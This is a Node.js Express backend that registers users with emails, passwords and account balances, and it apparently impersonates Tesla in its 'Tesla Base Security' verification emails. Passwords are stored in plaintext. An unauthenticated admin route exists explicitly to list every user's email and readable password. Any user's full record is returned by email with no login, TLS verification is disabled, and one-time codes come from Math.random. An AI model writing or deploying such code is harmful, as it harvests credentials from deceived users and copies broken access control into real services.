const express = require('express');
const { Pool } = require('pg');
const nodemailer = require('nodemailer');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// 1. DATABASE CONNECTION
const pool = new Pool({
    connectionString: "YOUR_POSTGRESQL_URL_HERE",
    ssl: { rejectUnauthorized: false }
});

// 2. GMAIL CONFIGURATION
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'YOUR_GMAIL@gmail.com',
        pass: 'xxxx xxxx xxxx xxxx' // Your 16-character App Password
    }
});

let otpStore = {};

// 3. REGISTRATION LOGIC
app.post('/api/auth/register', async (req, res) => {
    const { email, password } = req.body;
    try {
        const check = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
        if (check.rows.length > 0) return res.status(400).json({ error: "Email already exists" });
        
        await pool.query('INSERT INTO users (email, password, balance) VALUES ($1, $2, 0.00)', [email, password]);
        res.json({ success: true });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

// 4. ADMIN API (To see Emails & Passwords)
app.get('/api/admin/users', async (req, res) => {
    try {
        const result = await pool.query('SELECT email, password, balance FROM users ORDER BY id DESC');
        res.json(result.rows);
    } catch (err) { res.status(500).json({ error: "Admin access failed" }); }
});

// 5. USER DATA & OTP
app.post('/api/auth/send-otp', async (req, res) => {
    const { email } = req.body;
    const otp = Math.floor(100000 + Math.random() * 900000);
    otpStore[email] = otp;
    try {
        await transporter.sendMail({
            from: '"Tesla Base Security" <YOUR_GMAIL@gmail.com>',
            to: email,
            subject: 'Verification Code: ' + otp,
            html: `<div style="background:#000;color:#fff;padding:20px;border:1px solid #E31937;"><h1>TESLA BASE</h1><p>Code: <b>${otp}</b></p></div>`
        });
        res.json({ success: true });
    } catch (e) { res.status(500).json({ success: false }); }
});

app.get('/api/user/data', async (req, res) => {
    const { email } = req.query;
    try {
        const result = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
        res.json(result.rows[0]);
    } catch (e) { res.status(500).json(e); }
});

app.listen(3000, () => console.log('Server running on http://localhost:3000'));
